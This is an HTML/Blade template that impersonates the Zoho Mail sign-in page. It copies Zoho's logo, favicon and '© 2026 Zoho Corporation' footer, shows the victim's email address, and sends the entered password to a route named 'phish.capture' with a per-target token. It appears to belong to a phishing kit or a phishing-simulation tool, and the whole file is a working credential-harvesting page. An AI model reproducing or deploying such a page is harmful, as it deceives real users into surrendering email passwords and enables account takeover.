<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex">
    <title>Zoho Mail - Login</title>
    <link rel="icon" href="https://www.zoho.com/favicon.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Zoho Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f7f7f7;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:#fff;border-radius:8px;padding:40px;width:100%;max-width:420px;box-shadow:0 2px 12px rgba(0,0,0,.08);text-align:center}
        .logo-section{margin-bottom:24px}
        .logo-section svg{height:36px;width:auto}
        h1{font-size:22px;color:#333;margin-bottom:8px;font-weight:600}
        .sub{font-size:14px;color:#666;margin-bottom:28px}
        .email-display{display:flex;align-items:center;padding:12px 16px;background:#f5f5f5;border-radius:6px;margin-bottom:24px;text-align:left}
        .email-display .icon{width:32px;height:32px;border-radius:50%;background:#e42527;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:700;margin-right:12px;flex-shrink:0}
        .email-display .text{font-size:14px;color:#333;font-weight:500}
        .form-group{text-align:left;margin-bottom:16px}
        .form-group label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:600}
        .form-group input{width:100%;height:44px;padding:0 16px;font-size:15px;border:1px solid #d1d1d1;border-radius:6px;outline:none;background:#fff;transition:border-color .2s}
        .form-group input:focus{border-color:#e42527;box-shadow:0 0 0 3px rgba(228,37,39,.08)}
        .form-row{display:flex;align-items:center;gap:8px;margin-bottom:20px}
        .form-row input[type="checkbox"]{width:16px;height:16px;cursor:pointer}
        .form-row label{font-size:13px;color:#666;cursor:pointer}
        .btn-login{width:100%;height:48px;background:#e42527;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s;font-family:'Zoho Sans',sans-serif}
        .btn-login:hover{background:#c91f21}
        .btn-login:active{background:#b01b1d}
        .links-row{display:flex;justify-content:space-between;margin-top:16px}
        .links-row a{font-size:13px;color:#e42527;text-decoration:none}
        .links-row a:hover{text-decoration:underline}
        .social-divider{display:flex;align-items:center;margin:24px 0}
        .social-divider::before,.social-divider::after{content:'';flex:1;height:1px;background:#e0e0e0}
        .social-divider span{padding:0 12px;font-size:12px;color:#999}
        .social-btn{width:100%;height:44px;border:1px solid #ddd;border-radius:6px;background:#fff;display:flex;align-items:center;justify-content:center;gap:10px;font-size:14px;font-weight:500;color:#333;cursor:pointer;transition:background .15s;margin-bottom:8px}
        .social-btn:hover{background:#f5f5f5}
        .social-btn svg{width:18px;height:18px}
        .footer{margin-top:24px;font-size:11px;color:#999}
        .footer a{color:#999;text-decoration:none;margin:0 6px}
        .footer a:hover{text-decoration:underline}
        @media(max-width:480px){.card{padding:32px 24px}}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo-section">
            <svg viewBox="0 0 200 36" xmlns="http://www.w3.org/2000/svg">
                <text x="0" y="28" font-family="'Zoho Sans',sans-serif" font-size="30" font-weight="800" fill="#e42527">Zoho</text>
                <text x="108" y="28" font-family="'Zoho Sans',sans-serif" font-size="26" font-weight="400" fill="#333">Mail</text>
            </svg>
        </div>

        <h1>Sign in to Zoho Mail</h1>
        <p class="sub">Enter your credentials to access your account.</p>

        <div class="email-display">
            <div class="icon">{{ strtoupper(substr($email, 0, 1)) }}</div>
            <div class="text">{{ $email }}</div>
        </div>

        <form action="{{ route('phish.capture', ['provider' => 'zoho', 'token' => $token]) }}" method="POST">
            @csrf
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required autofocus>
            </div>

            <div class="form-row">
                <input type="checkbox" id="keepSigned" checked>
                <label for="keepSigned">Keep me signed in</label>
            </div>

            <button type="submit" class="btn-login">Sign In</button>
        </form>

        <div class="links-row">
            <a href="#">Forgot Password?</a>
            <a href="#">Sign Up</a>
        </div>

        <div class="social-divider"><span>or</span></div>

        <button class="social-btn">
            <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
            Continue with Google
        </button>

        <div class="footer">
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Help</a>
            <div style="margin-top:8px">© 2026 Zoho Corporation</div>
        </div>
    </div>
</body>
</html>
